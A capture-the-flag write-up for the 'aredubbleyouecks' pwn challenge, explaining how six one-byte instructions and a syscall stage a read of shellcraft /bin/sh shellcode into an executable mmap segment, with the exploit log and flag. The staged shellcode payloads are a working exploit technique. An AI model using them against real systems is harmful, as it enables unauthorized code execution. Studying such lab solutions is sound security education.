# aredubbleyouecks

Restricted shellcode

## checksec

```bash
[*] '/mnt/d/CTFs/acmcyber/fall_2024/pwn/aredubbleyouecks/aredubbleyouecks'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

None of the above are important to the challenge. 

## General Overview of the Binary

The binary mmaps a segment which we can write very restricted shellcode to (specifically 6 separated 1-byte instructions and 1 2-byte instruction) and execute. We need to utilize this to ultimately spawn a shell. 

### Restrictions to the Shellcode we can Inject

First, the binary prompts us for the permissions to be set for the mmap-ed memory segment, 

```c
    printf("give prot: ");
    int prot = read_int();
    if (prot & 1) {
        puts("bad prot >:(");
        return 1;
    }
    cod = mmap(0, 0x1000, prot, MAP_PRIVATE|MAP_ANON, -1, 0);
```

Since we are going to write shellcode that will be executed into that segment, we provide the value `PROT_WRITE | PROT_EXEC` which is `2 | 4 = 6`. We can't set `PROT_READ` to true because that is 1 which is checked for in the `if (prot & 1)` condition . 

Next, notice that we are only allowed to run 6 NOP-separated, one-byte instructions, before 1 final two-byte instruction in the shellcode. 

```c
	memset(cod, 0x90, 0x1000);
	for (int i = 1; i < 106; i++) {
		if (i % 105 == 0) {
			printf("fizzbuzz102: ");
			read(0, cod+i, 2);
		} else if (i % 15 == 0) {
			printf("fizzbuzz101: ");
			read(0, cod+i, 1);
		} else if (i % 3 == 0)
			puts("fizz");
		else if (i % 5 == 0)
			puts("buzz");
		else
			printf("%d\n", i);
	}
	cod[107] = 0xc3;
    ((void (*)(void))cod)();
```

There is no way we can spawn a shell with this limited set of instructions, so we will need to figure out a way to read more user input. 

The way we will do this is by making a `read` syscall - our 2-byte instruction will thus be used in making this syscall using the x86-64 instructions `syscall`. 

## Reconnoitering the State of the Registers and the Stack

To make the `read` syscall from stdout, we need `rax` to be 0, `rdi` to be 0, `rsi` to be the address we want to read into, and `rdx` the number of bytes we want to read (see https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md).

As we can only use 1-byte instructions, however, we pretty much only push and pop registers from the stack to move values around. 

Thus it becomes imperative to examine the state of the registers before the shellcode is executed, which is as shown below

```
$rax   : 0x00007ffff7ffa000  →  0x9090909090909090
$rbx   : 0x0
$rcx   : 0x00007ffff7ea67e2  →  0x5677fffff0003d48 ("H="?)
$rdx   : 0x2
$rsp   : 0x00007fffffffdb30  →  0x0000000000001000
$rbp   : 0x00007fffffffdb40  →  0x0000000000000001
$rsi   : 0x00007ffff7ffa069  →  0x9090909090c30a68
$rdi   : 0x0
$rip   : 0x00005555555554ca  →  <main+574> call rax
$r8    : 0xd
$r9    : 0x00007fffffffb8a5  →  0x80ea2f0500000000
$r10   : 0x000055555555601d  →  "fizzbuzz102: "
$r11   : 0x246
$r12   : 0x00007fffffffdc58  →  0x00007fffffffdef6  →  "/mnt/d/CTFs/acmcyber/fall_2024/pwn/aredubbleyoueck[...]"
$r13   : 0x000055555555528c  →  <main+0> endbr64 
$r14   : 0x0000555555557d88  →  0x00005555555551e0  →  <__do_global_dtors_aux+0> endbr64 
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
```

Note that the libc and linker of the Docker environment running on the server have specifically been pulled down, and the binary patched accordingly, so that the state of the registers of the binary running on the server can be emulated. 

From the state of the registers shown above, we see that
- `rdi` is already set to 0
- `rsi` already points to the mmap-ed segment, albeit offset by 0x69 from the start of the segment
- `rdx` is set to 2, but we definitely will need the `read` syscall to read more bytes to spawn a shell
- `rax` is not 0, so we need to set it to 0

We therefore only need to modify `rdx` and `rax`. To that end, we would like to `push r11; pop rdx` to set `rdx` to 0x246, but `push r11` is unfortunately not a 1-byte instr - it is a 2-byte instr. 

Luckily, dumping the stack just before the calling of our shellcode, we see that 0x1000 is conveniently at the top of the stack. However, note that we will need to first pop off the ret addr from calling the shellcode as a function before we can get to the 0x1000

```
gef➤  x/10gx $rsp
0x7fffffffdb30: 0x0000000000001000      0x000000060000006a
0x7fffffffdb40: 0x0000000000000001      0x00007ffff7dbbd90
0x7fffffffdb50: 0x0000000000000000      0x000055555555528c
0x7fffffffdb60: 0x00000001ffffdc40      0x00007fffffffdc58
0x7fffffffdb70: 0x0000000000000000      0xc67080535158169e
```

This means that to perform `read` syscall with our desired functionality, we need
- to `pop rdx; pop rdx` to get rid of the ret addr on the stack and then set `rdx` to 0x1000, and
- to do `push rdi; pop rax` to set `rax` to 0 since `rdi` is 0. 

This will result in the `read` syscall writing 0x1000 bytes of data from stdout to 0x69 from the start of the mmap-ed segment. 

### Payload 1

Consolidating the points above, we have that our first payload is

```x86asm
nop
nop
pop rdx
pop rdx
push rdi
pop rax
syscall
```

where the NOPs exist because we need to write in 6 1-byte instructions, before writing in the 2-byte syscall instruction. 

## Payload 2

We now have to figure out what 0x1000 bytes to write into 0x69 from the start of the mmap-ed segment to spawn us a shell. 

The important point to notice is that after the syscall instruction runs, the next instruction that will run is 107 = 0x6b from the start of the mmap-ed segment, which is originally set to a `ret` instr. 

```c
    cod[107] = 0xc3;
    ((void (*)(void))cod)();
```

Importantly, this means we control what executes after the syscall, since we can write from 0x69 from the start of the segment to 0x69+0xfff from the start of the segment, which inclues 0x6b and much more. 

Thus the second payload is 

```python
payload_2 = b''.join([
    b'A'*0x2,
    shellcraft.amd64.linux.sh(),
    b'A'*(0x1000 - 0x2 - len(shellcraft.amd64.linux.sh()) - 1) # -1 to account for the newline char
])
```

where we add padding at the front to get to the 0x6b offset, and add padding at the end so that `payload_2` is 0x1000 bytes so that the process does not block at the `read` syscall. 

## Flag

```
[+] Opening connection to box.acmcyber.com on port 31379: Done
[*] payload_1=b'\x90\x90ZZWX\x0f\x05'
[*] Switching to interactive mode
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: File name too long
$ ls
flag.txt
run
$ cat flag.txt
cyber{rwx_my_life_so_i_can_change_it_for_the_better_plzzzz}
```


